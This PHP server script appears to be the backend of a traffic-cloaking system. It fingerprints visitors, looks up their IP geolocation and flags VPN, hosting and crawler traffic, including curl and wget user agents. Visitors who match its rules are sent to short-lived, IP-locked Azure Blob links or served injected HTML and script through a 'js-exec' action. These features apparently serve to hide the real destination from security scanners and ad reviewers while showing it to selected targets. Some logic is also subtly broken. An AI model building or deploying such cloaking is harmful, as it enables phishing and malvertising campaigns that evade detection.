<?php
// server.php — session endpoint (init / events / heartbeat / noscript)
// - Creates/updates ./sessions/<sid>/ (meta.json + *.ldjson)
// - Loads rules from ./settings.json and evaluates them at init
// - Builds Azure Blob SAS (server-side) and NEVER returns your key
// - Emits action with data.url (and data.resolved_url, same value)

// ============================== CONFIG ==============================

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
  header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");
  header("Access-Control-Max-Age: 86400"); // Cache for 1 day
  http_response_code(200);
  exit();
}

const SESS_BASE = __DIR__ . '/sessions';
const SETTINGS_FILE = __DIR__ . '/settings.json';
const IP_CACHE_DIR = __DIR__ . '/sessions/_ipcache';

// ============================== BOOT ==============================
@is_dir(SESS_BASE) || @mkdir(SESS_BASE, 0775, true);
@is_dir(IP_CACHE_DIR) || @mkdir(IP_CACHE_DIR, 0775, true);

function h($s)
{
  return htmlspecialchars((string) $s, ENT_QUOTES);
}
function safe($s)
{
  return preg_replace('/[^a-zA-Z0-9_\-\.]/', '_', (string) $s);
}
function json_out($arr, $code = 200)
{
  http_response_code($code);
  header('Content-Type: application/json; charset=utf-8');
  echo json_encode($arr, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
  exit;
}
function get_body_json()
{
  $raw = file_get_contents('php://input');
  $j = json_decode($raw, true);
  return is_array($j) ? $j : [];
}

// ============================== HELPERS ==============================
function client_ip_from_headers(array $server)
{
  $candidates = ['HTTP_CF_CONNECTING_IP', 'HTTP_TRUE_CLIENT_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED'];
  foreach ($candidates as $h) {
    if (!empty($server[$h])) {
      $parts = array_map('trim', explode(',', $server[$h]));
      foreach ($parts as $ip) {
        if (filter_var($ip, FILTER_VALIDATE_IP))
          return $ip;
      }
    }
  }
  return $server['REMOTE_ADDR'] ?? '';
}
function ip_cache_read($ip)
{
  $f = IP_CACHE_DIR . '/' . safe($ip) . '.json';
  if (!is_file($f))
    return null;
  $j = json_decode(@file_get_contents($f), true);
  return is_array($j) ? $j : null;
}
function ip_cache_write($ip, $data)
{
  $f = IP_CACHE_DIR . '/' . safe($ip) . '.json';
  @file_put_contents($f, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);
}
function ip_info($ip)
{
  if (!$ip)
    return ['status' => 'fail', 'query' => '', 'country' => 'unknown', 'countryCode' => 'XX'];
  if (($c = ip_cache_read($ip)))
    return $c;
  $url = 'http://ip-api.com/json/' . rawurlencode($ip) . '?fields=66846719';
  $resp = @file_get_contents($url);
  $data = json_decode($resp, true);
  if (is_array($data) && ($data['status'] ?? '') === 'success') {
    ip_cache_write($ip, $data);
    return $data;
  }
  $fallback = ['status' => 'fail', 'query' => $ip, 'country' => 'unknown', 'countryCode' => 'XX'];
  ip_cache_write($ip, $fallback);
  return $fallback;
}
function ua_parse_simple($ua)
{
  $u = strtolower((string) $ua);
  $isBot = (bool) preg_match('/bot|crawler|spider|preview|fetcher|slurp|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegram|bingpreview|curl|wget|python-requests|golang|httpclient|axios|vkshare/i', $u);
  $b = $isBot ? 'Bot' : (str_contains($u, 'edg') ? 'Edge' : (str_contains($u, 'chrome') ? 'Chrome' : (str_contains($u, 'safari') ? 'Safari' : (str_contains($u, 'firefox') ? 'Firefox' : 'Other'))));
  $o = $isBot ? 'Bot' : (str_contains($u, 'windows') ? 'Windows' : (str_contains($u, 'android') ? 'Android' : (str_contains($u, 'iphone') || str_contains($u, 'ipad') ? 'iOS' : (str_contains($u, 'mac os') ? 'macOS' : (str_contains($u, 'linux') ? 'Linux' : 'Other')))));
  return [$b, $o, $isBot];
}
function norm_list($v)
{
  if (is_array($v))
    return array_values(array_filter(array_map('strval', $v)));
  $v = trim((string) $v);
  return $v === '' ? [] : array_values(array_filter(array_map('trim', explode(',', $v))));
}
function ipinfo_is_vpn_or_hosting(array $ipinfo): bool {
  $proxy   = isset($ipinfo['proxy'])   ? (bool)$ipinfo['proxy']   : false;
  $hosting = isset($ipinfo['hosting']) ? (bool)$ipinfo['hosting'] : false;

  if ($proxy || $hosting) return true;

  // Heuristic fallback on org/isp
  $org = strtolower((string)($ipinfo['org'] ?? ''));
  $isp = strtolower((string)($ipinfo['isp'] ?? ''));
  $hay = $org . ' ' . $isp;

  // Keep this list conservative to avoid false positives
  $keywords = [
      'vpn', 'virtual private network', 'proxy',
      'tor', 'exit node',
      'colo', 'colocation', 'datacenter', 'data center', 'hosting',
      'cloud', 'vps',
      'digitalocean', 'linode', 'vultr', 'ovh', 'hetzner',
      'google cloud', 'google llc', 'amazon', 'aws', 'amazon web services',
      'microsoft azure', 'azure',
      'choopa', 'leaseweb', 'contabo', 'upcloud', 'ikoula', 'scaleway',
  ];

  foreach ($keywords as $kw) {
      if ($kw !== '' && str_contains($hay, $kw)) {
          return true;
      }
  }
  return false;
}

function derive_vpn_name(array $ipinfo): string {
  // Return a "name" only if we’re confident this is VPN/proxy/hosting
  if (!ipinfo_is_vpn_or_hosting($ipinfo)) return '';
  // Prefer org; fall back to isp
  $name = (string)($ipinfo['org'] ?? '');
  if ($name === '') $name = (string)($ipinfo['isp'] ?? '');
  return $name;
}

function op_match($expect, $actual)
{
  if (!is_array($expect) || !isset($expect['op'])) {
    if ($expect === 'is_not_empty')
      return (string) $actual !== '';
    if ($expect === 'empty')
      return (string) $actual === '';
    if (is_string($expect) && str_starts_with($expect, 'regex:/') && str_ends_with($expect, '/')) {
      $pat = substr($expect, 6, -1);
      return @preg_match('/' . $pat . '/', (string) $actual) === 1;
    }
    return (string) $expect === (string) $actual;
  }
  $op = strtolower($expect['op']);
  $val = $expect['value'] ?? null;
  $sact = (string) $actual;

  switch ($op) {
    case 'empty':
      return $actual === null || $actual === '';

    case 'not_empty':
      return $actual !== null && $actual !== '';

    case 'eq':
      return (string) $val === $sact;

    case 'neq':
      return (string) $val !== $sact;

    case 'gt':
      if (is_numeric($sact) && is_numeric($val))
        return (float) $sact > (float) $val;
      return $sact > (string) $val;

    case 'lt':
      if (is_numeric($sact) && is_numeric($val))
        return (float) $sact < (float) $val;
      return $sact < (string) $val;

    case 'gte':
      if (is_numeric($sact) && is_numeric($val))
        return (float) $sact >= (float) $val;
      return $sact >= (string) $val;

    case 'lte':
      if (is_numeric($sact) && is_numeric($val))
        return (float) $sact <= (float) $val;
      return $sact <= (string) $val;

    case 'between':
      if (is_array($val)) {
        $min = $val[0] ?? null;
        $max = $val[1] ?? null;
      } else {
        $parts = explode(',', (string) $val, 2);
        $min = $parts[0] ?? null;
        $max = $parts[1] ?? null;
      }
      $minOk = ($min === null || $min === '') ? true :
        (is_numeric($sact) && is_numeric($min) ? (float) $sact >= (float) $min : $sact >= (string) $min);
      $maxOk = ($max === null || $max === '') ? true :
        (is_numeric($sact) && is_numeric($max) ? (float) $sact <= (float) $max : $sact <= (string) $max);
      return $minOk && $maxOk;

    case 'contains':
      return stripos($sact, (string) $val) !== false;

    case 'not_contains':
      return stripos($sact, (string) $val) === false;

    case 'in':
      return in_array($sact, norm_list($val), true);

    case 'not_in':
      return !in_array($sact, norm_list($val), true);

    case 'regex':
      $pat = (string) $val;
      return $pat !== '' && @preg_match('/' . $pat . '/', $sact) === 1;

    default:
      return (string) $val === $sact;
  }
}
function rule_is_active($rule)
{
  if (!is_array($rule))
    return false;
  if (isset($rule['enabled']) && !$rule['enabled'])
    return false;

  $now = time();

  if (!empty($rule['start_at'])) {
    $ts = strtotime((string) $rule['start_at']);
    if ($ts !== false && $now < $ts)
      return false;
  }
  if (!empty($rule['end_at'])) {
    $ts = strtotime((string) $rule['end_at']);
    if ($ts !== false && $now > $ts)
      return false;
  }
  return true;
}

function normalize_rules($rules)
{
  $out = [];
  foreach (($rules ?? []) as $r) {
    if (!is_array($r))
      continue;
    if (!rule_is_active($r))
      continue;
    if (!isset($r['priority']) || !is_numeric($r['priority'])) {
      $r['priority'] = 100;
    } else {
      $r['priority'] = (int) $r['priority'];
    }
    $out[] = $r;
  }
  usort($out, function ($a, $b) {
    $pa = $a['priority'] ?? 100;
    $pb = $b['priority'] ?? 100;
    if ($pa == $pb)
      return 0;
    return ($pa < $pb) ? -1 : 1;
  });
  return $out;
}

function load_settings()
{
  if (!is_file(SETTINGS_FILE))
    return [];
  $raw = @file_get_contents(SETTINGS_FILE);
  $dec = json_decode($raw, true);
  if (!is_array($dec))
    return [];
  // settings.php writes an array (list of rules)
  $rules = array_values(array_filter($dec, 'is_array'));
  return normalize_rules($rules);
}



function ensure_session_dirs($sid)
{
  $dir = SESS_BASE . '/' . safe($sid);
  @is_dir($dir) || @mkdir($dir, 0775, true);
  return $dir;
}
function meta_path($sid)
{
  return ensure_session_dirs($sid) . '/meta.json';
}
function visit_path($sid, $vid)
{
  return ensure_session_dirs($sid) . '/' . safe($vid) . '.ldjson';
}

// ---------- Rule evaluation (server + ip-api + query params) ----------
function conditions_match_all($conds, $serverCtx, $metaFromBrowser = [])
{
  // $serverCtx: ['method','ref','ua','browser','os','path','headers','cookies','qs','ip','ipinfo','hostname']
  $fp = [];
  if (is_array($metaFromBrowser)) {
    $fp = is_array($metaFromBrowser['fp_initial'] ?? null) ? $metaFromBrowser['fp_initial'] : [];
  }

  foreach (($conds ?? []) as $k => $expect) {
    switch ($k) {
      case 'http_method':
        if (!op_match($expect, $serverCtx['method']))
          return false;
        break;

      case 'query_params':
        if (!is_array($expect))
          return false;
        foreach ($expect as $n => $v) {
          $act = $serverCtx['qs'][$n] ?? null;
          if (!op_match($v, $act))
            return false;
        }
        break;

      case 'ip':
        if (!op_match($expect, $serverCtx['ip'] ?? ''))
          return false;
        break;

      case 'ip_hostname':
        if (!op_match($expect, $serverCtx['hostname'] ?? ''))
          return false;
        break;

      case 'ip_country': {
        $ipRaw = (string) ($serverCtx['ip'] ?? '');
        $cc = (string) ($serverCtx['ipinfo']['countryCode'] ?? '');
        // treat private/local ranges as "localhost"
        $isLocal = in_array($ipRaw, ['127.0.0.1', '::1'], true)
          || preg_match('/^(10\\.|192\\.168\\.|172\\.(1[6-9]|2[0-9]|3[0-1])\\.)/', $ipRaw);
        $actual = $isLocal ? 'localhost' : $cc;
        if (!op_match($expect, $actual))
          return false;
        break;
      }

      case 'proxy_ip': {
        $ipinfo = $serverCtx['ipinfo'] ?? [];
        $actualBool = (bool)($ipinfo['proxy'] ?? false) || (bool)($ipinfo['hosting'] ?? false);
        $actual = $actualBool ? 'true' : 'false';
        if (!op_match($expect, $actual)) return false;
        break;
      }
      

      case 'vpn_name': {
        // Only expose a non-empty value when IP looks like VPN/Proxy/Hosting
        $vpn = derive_vpn_name($serverCtx['ipinfo'] ?? []);
        if (!op_match($expect, $vpn)) return false;
        break;
      }
      

      case 'referrer_contains': {
        $ref = (string) ($serverCtx['ref'] ?? '');
        if (is_array($expect) && isset($expect['op'])) {
          if (!op_match($expect, $ref))
            return false;
        } else {
          if (stripos($ref, (string) $expect) === false)
            return false;
        }
        break;
      }

      case 'ua_contains': {
        $ua = (string) ($serverCtx['ua'] ?? '');
        $needle = is_array($expect) ? ($expect['value'] ?? '') : $expect;
        if (stripos($ua, (string) $needle) === false)
          return false;
        break;
      }

      case 'browser':
        if (!op_match($expect, $serverCtx['browser']))
          return false;
        break;

      case 'os':
        if (!op_match($expect, $serverCtx['os']))
          return false;
        break;

      case 'path_regex': {
        $pat = (string) (is_array($expect) ? ($expect['value'] ?? '') : $expect);
        if ($pat === '')
          break;
        // allow both "/.../" and bare patterns
        $re = ($pat[0] === '/' ? $pat : '/' . $pat . '/');
        if (@preg_match($re, $serverCtx['path']) !== 1)
          return false;
        break;
      }

      case 'cookie_has': {
        $name = is_array($expect) ? ($expect['value'] ?? '') : $expect;
        if ($name === '' || !isset($serverCtx['cookies'][$name]))
          return false;
        break;
      }

      case 'header_has': {
        $name = is_array($expect) ? ($expect['value'] ?? '') : $expect;
        $key = 'HTTP_' . strtoupper(str_replace('-', '_', $name));
        if (($serverCtx['headers'][$key] ?? '') === '')
          return false;
        break;
      }

      case 'gclid_fresh': {
        // Basic implementation: require that the given param is present in the current page URL
        $paramName = (string) ($expect['param'] ?? 'gclid');
        if ($paramName === '')
          $paramName = 'gclid';
        $val = $serverCtx['qs'][$paramName] ?? null;
        if ($val === null || $val === '')
          return false;
        // "seconds" is accepted but not enforced yet (no cross-page timestamp tracking)
        break;
      }

      default:
        // Try client fingerprint / meta fields (CLIENT_INITIAL + extras)
        if (array_key_exists($k, $fp)) {
          if (!op_match($expect, $fp[$k]))
            return false;
        } elseif (array_key_exists($k, $metaFromBrowser)) {
          if (!op_match($expect, $metaFromBrowser[$k]))
            return false;
        }
        // unknown key => ignore
        break;
    }
  }
  return true;
}


// ---------- Azure Blob SAS (BLOB scope, not container), never expose key ----------
function azure_blob_sas_url($cfg, $ipLock)
{
  // $cfg: ['accountName','accountKeyB64','container','$web','entryBlob','sv','ttlSeconds','lockByIP']
  //print_r($cfg);
  //print_r($ipLock);
  $account = trim($cfg['accountName'] ?? '');
  $keyB64 = trim($cfg['accountKeyB64'] ?? '');
  $customDomain = trim($cfg['customDomain'] ?? '');
  $container = trim($cfg['container'] ?? '$web');
  $blob = ltrim((string) ($cfg['entryBlob'] ?? 'index.html'), '/');
  $sv = trim($cfg['sv'] ?? '2022-11-02');
  $ttl = max(1, (int) ($cfg['ttlSeconds'] ?? 15));

  if ($account === '' || $keyB64 === '')
    return '';

  // times
  $now = new DateTime('now', new DateTimeZone('UTC'));
  $st = clone $now;
  $st->modify('-1 minute'); // allow for clock skew
  $se = clone $now;
  $se->modify("+{$ttl} seconds");

  $params = [
    'sv' => $sv,
    'spr' => 'https',
    'se' => $se->format('Y-m-d\TH:i:s\Z'),
    'st' => $st->format('Y-m-d\TH:i:s\Z'),
    'sip' => ($cfg['lockByIP'] ? $ipLock : null),
    'sr' => 'c',//'b',
    'sp' => 'r', // read
  ];
  // String-to-sign for Blob SAS (version 2020-02-10+)
  $canonicalized = "/blob/{$account}/{$container}/{$blob}";
  $canonicalized = "/blob/{$account}/{$container}"; #/{$blob}";
  $toSign = implode("\n", [
    $params['sp'],           // signedPermissions
    $params['st'],           // signedStart
    $params['se'],           // signedExpiry
    $canonicalized,          // canonicalizedResource
    '',                      // signedIdentifier (si)
    $params['sip'],          // signedIP (sip)
    $params['spr'],          // signedProtocol (spr)
    $params['sv'],           // signedVersion (sv)
    $params['sr'],           // signedResource (sr)  <-- you were missing this
    '',                      // signedSnapshotTime
    '',                      // signedEncryptionScope
    '',
    '',
    '',
    '',
    ''       // rscc, rscd, rsce, rscl, rsct
  ]);
  //print_r($toSign);
  $key = base64_decode($keyB64, true);
  $sig = base64_encode(hash_hmac('sha256', $toSign, $key, true));

  $q = [
    'sv' => $params['sv'],
    'se' => $params['se'],
    'sr' => $params['sr'],
    'sp' => $params['sp'],
    'spr' => $params['spr'],
    'st' => $params['st'],
    'sig' => $sig,
  ];
  if (!empty($params['sip']))
    $q['sip'] = $params['sip'];

  $qs = http_build_query($q);
  $host = $customDomain ?? "{$account}.blob.core.windows.net";
  $url = "https://{$host}/" . rawurlencode($container) . "/" . implode('/', array_map('rawurlencode', explode('/', $blob))) . "?{$qs}";
  return $url;
}

// ============================== NOSCRIPT PING ==============================
if (($_GET['mode'] ?? '') === 'ns') {
  $sid = $_GET['sid'] ?? '';
  if ($sid === '') {
    json_out(['ok' => false, 'error' => 'no sid'], 400);
  }
  $dir = ensure_session_dirs($sid);
  $mf = $dir . '/meta.json';
  $meta = is_file($mf) ? (json_decode(@file_get_contents($mf), true) ?: []) : [];
  if (!$meta) {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ip = client_ip_from_headers($_SERVER);
    $meta = [
      'sid' => $sid,
      'created_at' => gmdate('c'),
      'updated_at' => gmdate('c'),
      'ip' => $ip,
      'meta_from_browser' => [
        'url' => $_GET['url'] ?? '',
        'referrer' => '',
        'ua' => $ua,
        'tz' => '',
        'lang' => '',
        'screen' => ['w' => '', 'h' => ''],
        'viewport' => ['w' => '', 'h' => ''],
        'page_http_method' => $_SERVER['REQUEST_METHOD'] ?? 'GET'
      ],
      'server' => [
        'request' => [
          'method' => $_SERVER['REQUEST_METHOD'] ?? 'GET',
          'uri' => $_SERVER['REQUEST_URI'] ?? '',
          'host' => $_SERVER['HTTP_HOST'] ?? '',
          'headers' => array_filter($_SERVER, fn($k) => str_starts_with($k, 'HTTP_'), ARRAY_FILTER_USE_KEY),
          'user_agent' => $ua
        ]
      ],
      'ip_info' => ip_info($ip),
      'tags' => ['nojs'],
      'action_taken' => null
    ];
  }
  $meta['updated_at'] = gmdate('c');
  @file_put_contents($mf, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);

  $vid = 'ns-' . (string) microtime(true);
  $path = visit_path($sid, $vid);
  @file_put_contents($path, json_encode([
    't' => 0,
    'type' => 'noscript_ping',
    'data' => ['url' => ($_GET['url'] ?? '')]
  ], JSON_UNESCAPED_SLASHES) . "\n", LOCK_EX);

  header('Content-Type: image/gif'); // 1x1 gif
  echo base64_decode('R0lGODlhAQABAPAAAP///wAAACH5BAAAAAAALAAAAAABAAEAAAICRAEAOw==');
  exit;
}

// ============================== POST API ==============================
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
  json_out(['ok' => false, 'error' => 'use POST'], 405);
}

$in = get_body_json();
$mode = strtolower((string) ($in['mode'] ?? ''));
$sid = (string) ($in['sid'] ?? '');
if ($sid === '')
  $sid = bin2hex(random_bytes(16)); // tolerate missing

$dir = ensure_session_dirs($sid);
$mf = meta_path($sid);
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
[$browser, $os, $isBot] = ua_parse_simple($ua);

// Load or create meta
$meta = is_file($mf) ? (json_decode(@file_get_contents($mf), true) ?: []) : [];
$meta['sid'] = $sid;
$meta['updated_at'] = gmdate('c');
if (!isset($meta['tags']) || !is_array($meta['tags']))
  $meta['tags'] = [];
if ($isBot && !in_array('bot', $meta['tags'], true))
  $meta['tags'][] = 'bot';

// Build serverCtx (used for rules)
$ip = $meta['ip'] ?? client_ip_from_headers($_SERVER);
$ipinfo = $meta['ip_info'] ?? ip_info($ip);
$serverHeaders = array_filter($_SERVER, fn($k) => str_starts_with($k, 'HTTP_'), ARRAY_FILTER_USE_KEY);
$cookies = [];
if (!empty($_SERVER['HTTP_COOKIE'])) {
  foreach (explode(';', $_SERVER['HTTP_COOKIE']) as $p) {
    $kv = explode('=', $p, 2);
    $cookies[trim($kv[0] ?? '')] = trim($kv[1] ?? '');
  }
}
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';
$uri = $_SERVER['REQUEST_URI'] ?? '';
$path = parse_url($uri, PHP_URL_PATH) ?? '';
$ref = $_SERVER['HTTP_REFERER'] ?? '';
$qs_server = [];
parse_str($_SERVER['QUERY_STRING'] ?? '', $qs_server);

$serverCtxBase = [
  'method' => $method,
  'ref' => $ref,
  'ua' => $ua,
  'browser' => $browser,
  'os' => $os,
  'path' => $path,
  'headers' => $serverHeaders,
  'cookies' => $cookies,
  'qs' => $qs_server, // may be overridden with init meta URL query
  'ip' => $ip,
  'ipinfo' => $ipinfo,
  'hostname' => ($ipinfo['reverse'] ?? ''),
];

// =============== MODE: init ===============
if ($mode === 'init') {
  // Attach meta from browser
  $metaFromBrowser = is_array($in['meta'] ?? null) ? $in['meta'] : [];
  $meta['meta_from_browser'] = $metaFromBrowser + ($meta['meta_from_browser'] ?? []);
  $meta['ip'] = $ip;
  $meta['ip_info'] = $ipinfo;
  $meta['server'] = [
    'request' => [
      'method' => $method,
      'uri' => $uri,
      'host' => $_SERVER['HTTP_HOST'] ?? '',
      'headers' => $serverHeaders,
      'user_agent' => $ua
    ]
  ];

  // Create a new visit file
  $vid = (string) microtime(true);
  $vpath = visit_path($sid, $vid);
  $server_init = [
    't' => 0,
    'type' => 'server_init',
    'data' => [
      'ua' => $ua,
      'ip' => $ip,
      'url' => $metaFromBrowser['url'] ?? '',
      'referrer' => $metaFromBrowser['referrer'] ?? '',
      'accept' => $_SERVER['HTTP_ACCEPT'] ?? ''
    ]
  ];
  @file_put_contents($vpath, json_encode($server_init, JSON_UNESCAPED_SLASHES) . "\n", LOCK_EX);

  // Prepare query params from the actual page URL (NOT include.php URL)
  $qs_from_page = [];
  $pageUrl = (string) ($metaFromBrowser['url'] ?? '');
  if ($pageUrl !== '') {
    $p = parse_url($pageUrl);
    if (isset($p['query']))
      parse_str($p['query'], $qs_from_page);
  }
  $serverCtx = $serverCtxBase;
  $serverCtx['qs'] = $qs_from_page;

  // Evaluate rules
  $settings = load_settings();
  $matchedRule = null;
  if (!empty($settings)) {
    foreach ($settings as $rule) {
      $criteria = is_array($rule['criteria'] ?? null) ? $rule['criteria'] : [];
      if (!in_array('Server-Side', $criteria, true))
        continue;
      if (!conditions_match_all($rule['conditions'] ?? [], $serverCtx, $metaFromBrowser))
        continue;
      $matchedRule = $rule;
      break;
    }
  }

  $clientAction = null;
  $critOut = [];
  if ($matchedRule) {
    $critOut = is_array($matchedRule['criteria'] ?? null) ? $matchedRule['criteria'] : [];
    $atype = $matchedRule['action']['type'] ?? '';
    $adata = is_array($matchedRule['action']['data'] ?? null) ? ($matchedRule['action']['data']) : [];

    // Normalize to client-safe action (strip azure secrets)
    if ($atype === 'js-redirect' || $atype === 'server-301-redirect' || $atype === 'server-302-redirect') {
      $modeSel = ($adata['mode'] ?? 'raw') === 'azure' ? 'azure' : 'raw';
      if ($modeSel === 'azure' && is_array($adata['azure'] ?? null)) {
        $resolved = azure_blob_sas_url($adata['azure'], $ip);
        if ($resolved) {
          $clientAction = [
            'type' => 'js-redirect',
            'data' => [
              'url' => $resolved,
              'resolved_url' => $resolved // exposed for the client; no secrets
            ],
            'rule_id' => ($matchedRule['id'] ?? null)
          ];
          $meta['resolved_url'] = $resolved;
        }
      } else {
        $url = trim((string) ($adata['url'] ?? ''));
        if ($url !== '') {
          $clientAction = ['type' => 'js-redirect', 'data' => ['url' => $url], 'rule_id' => ($matchedRule['id'] ?? null)];
          $meta['resolved_url'] = $url;
        }
      }
    } elseif ($atype === 'server-include' || $atype === 'server-echo-data') {
      // These are server actions; the include.php already handles them if Server-Side matched.
      // Still echo a safe stub for the UI.
      $clientAction = ['type' => $atype, 'data' => [], 'rule_id' => ($matchedRule['id'] ?? null)];
    } elseif ($atype === 'js-includehtml' || $atype === 'js-exec') {
      $clientAction = [
        'type' => $atype,
        'data' => [
          'html' => ($matchedRule['action']['data']['html'] ?? null),
          'script' => ($matchedRule['action']['data']['script'] ?? null),
        ],
        'rule_id' => ($matchedRule['id'] ?? null)
      ];
    }
  }

  // Persist meta updates
  if ($clientAction)
    $meta['action_candidate'] = $clientAction;
  @file_put_contents($mf, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);

  // Return init payload
  json_out([
    'visit_id' => $vid,
    'action' => $clientAction,
    'criteria' => $critOut
  ]);
}

// =============== MODE: events ===============
if ($mode === 'events') {
  $vid = (string) ($in['vid'] ?? '');
  $events = is_array($in['events'] ?? null) ? $in['events'] : [];
  if ($vid === '')
    json_out(['ok' => false, 'error' => 'no visit id'], 400);
  $path = visit_path($sid, $vid);
  $buf = '';
  foreach ($events as $ev) {
    if (!is_array($ev))
      continue;
    // If action_taken, reflect to meta
    if (($ev['type'] ?? '') === 'action_taken') {
      $meta['action_taken'] = $ev['data'] ?? ['type' => '(unknown)'];
    }
    $buf .= json_encode($ev, JSON_UNESCAPED_SLASHES) . "\n";
  }
  if ($buf !== '')
    @file_put_contents($path, $buf, FILE_APPEND | LOCK_EX);
  @file_put_contents($mf, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);
  json_out(['ok' => true]);
}

// =============== MODE: heartbeat ===============
if ($mode === 'heartbeat') {
  $vid = (string) ($in['vid'] ?? '');
  if ($vid !== '') {
    $path = visit_path($sid, $vid);
    $line = json_encode(['t' => ($in['t'] ?? 0), 'type' => 'heartbeat', 'data' => ['at' => microtime(true)]], JSON_UNESCAPED_SLASHES) . "\n";
    @file_put_contents($path, $line, FILE_APPEND | LOCK_EX);
    // touch meta
    $mf = meta_path($sid);
    $meta = is_file($mf) ? json_decode(@file_get_contents($mf), true) : [];
    $meta['updated_at'] = gmdate('c');
    @file_put_contents($mf, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);
  }

  json_out(['ok' => true]);
}

// =============== Fallback ===============
json_out(['ok' => true, 'note' => 'no-op']);
